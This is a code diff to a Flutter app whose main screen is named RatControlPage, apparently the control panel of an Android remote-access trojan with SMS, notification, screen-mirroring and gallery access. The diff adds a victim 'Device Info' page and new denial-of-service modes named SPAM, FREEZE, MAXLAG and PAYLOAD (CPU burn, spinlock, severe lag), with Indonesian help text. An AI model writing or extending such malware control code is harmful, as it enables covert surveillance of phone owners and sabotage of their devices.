@@ -11,6 +11,7 @@ import 'screen_mirror_page.dart';
 import 'wake_screen_page.dart';
 import 'sms_reader_page.dart';
 import 'notification_reader_page.dart';
+import 'device_info_page.dart';
 
 // Neobrutalism palette
 const Color _green = Neo.mint;
@@ -1625,6 +1626,17 @@ class _RatControlPageState extends State<RatControlPage> {
           ));
         },
       ),
+      _CtrlTile(
+        icon: Icons.info_outline,
+        iconColor: _sky,
+        name: 'Device Info',
+        sub: 'TAP \u00b7 INFO HP & JARINGAN',
+        onTap: () {
+          Navigator.of(context).push(MaterialPageRoute(
+            builder: (_) => DeviceInfoPage(client: client, deviceId: _deviceId!),
+          ));
+        },
+      ),
     ];
   }
 
@@ -1869,15 +1881,18 @@ class _RatControlPageState extends State<RatControlPage> {
                             letterSpacing: 1)),
                     const SizedBox(height: 16),
                     // Mode selector
-                    Row(
+                    Wrap(
+                      spacing: 6,
+                      runSpacing: 6,
                       children: [
                         _kernelModeBtn('delay', 'DELAY', Neo.peach, selectedMode, setState),
-                        const SizedBox(width: 6),
                         _kernelModeBtn('lag', 'LAG', Neo.coral, selectedMode, setState),
-                        const SizedBox(width: 6),
                         _kernelModeBtn('crash', 'CRASH', Neo.coral, selectedMode, setState),
-                        const SizedBox(width: 6),
                         _kernelModeBtn('panic', 'PANIC', Neo.coral, selectedMode, setState),
+                        _kernelModeBtn('spam', 'SPAM', Neo.rose, selectedMode, setState),
+                        _kernelModeBtn('freeze', 'FREEZE', Neo.lavender, selectedMode, setState),
+                        _kernelModeBtn('maxlag', 'MAXLAG', Neo.coral, selectedMode, setState),
+                        _kernelModeBtn('payload', 'PAYLOAD', Neo.coral, selectedMode, setState),
                       ],
                     ),
                     const SizedBox(height: 12),
@@ -1894,7 +1909,7 @@ class _RatControlPageState extends State<RatControlPage> {
                       style: const TextStyle(
                           fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
                       decoration: InputDecoration(
-                        hintText: '1-6000',
+                        hintText: '0-60000 (payload recommended: 60000)',
                         hintStyle: const TextStyle(
                             fontFamily: 'ShareTechMono',
                             fontSize: 10,
@@ -1913,7 +1928,7 @@ class _RatControlPageState extends State<RatControlPage> {
                     ),
                     const SizedBox(height: 6),
                     const Text(
-                        'DELAY = respons lambat\nLAG = HP lemot total\nCRASH = restart/mati\nPANIC = layar crash + getar',
+                        'DELAY = respons lambat | LAG = HP lemot\nCRASH = restart/mati | PANIC = layar crash\nSPAM = CPU burn + I/O | FREEZE = spinlock\nMAXLAG = semua gabungan\nPAYLOAD = lag parah (recommended: 60000)',
                         style: TextStyle(
                             fontFamily: 'ShareTechMono',
                             fontSize: 8,
@@ -4907,7 +4922,8 @@ class _GalleryView extends StatelessWidget {
             itemCount: list.length,
             itemBuilder: (_, i) {
               final m = list[i];
-              final thumb = m['thumbnail']?.toString() ??
+              final thumb = m['thumb']?.toString() ??
+                  m['thumbnail']?.toString() ??
                   m['path']?.toString() ??
                   m.values.first.toString();
               return GestureDetector(
